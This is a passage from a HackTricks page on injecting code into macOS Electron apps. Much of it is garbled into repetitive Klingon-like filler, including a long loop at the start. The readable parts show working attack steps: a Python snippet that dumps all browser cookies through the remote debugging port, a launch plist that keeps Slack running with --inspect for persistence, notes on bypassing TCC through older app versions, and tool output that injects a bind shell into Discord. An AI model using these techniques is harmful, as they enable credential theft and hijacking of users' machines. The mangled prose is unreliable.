'ach, **electron param `--remote-debugging-port=9229`** vItlhutlh vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' v
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.

### Injection from the App Plist

You could abuse this env variable in a plist to maintain persistence adding these keys:

### App Plist-qaStaHvIS

jatlhqa'laHbe'chugh, plist vItlhutlhlaHchugh env variable vItlhutlhlaHchugh 'ej vItlhutlhlaHchugh qaStaHvIS jatlhqa'laHbe'chugh.
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

{% hint style="success" %}
TCC daemon macOS lo'laHbe'chugh, 'ej 'oH **Electron application** injection code 'oH previous techniques vItlhutlh. vaj 'ach, 'oH previous version 'oH 'ej code injection 'oH 'e' vItlhutlh 'ej TCC privileges ghaH (Trust Cache 'oH prevent).
{% endhint %}

## Run non JS Code

previous techniques 'oH **JS code process electron application** run vItlhutlh. 'ach, 'oH **child processes run under the same sandbox profile** as the parent application 'ej **TCC permissions** 'oH 'e' vItlhutlh.\
vaj, camera or microphone access entitlements abuse 'oH, 'oH **run another binary process**.

## Automatic Injection

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool 'oH **find vulnerable electron applications** installed 'ej code injection 'oH. 'oH tool 'ej **`--inspect`** technique vItlhutlh:

compile vItlhutlh 'ej vaj vItlhutlh:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## References

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
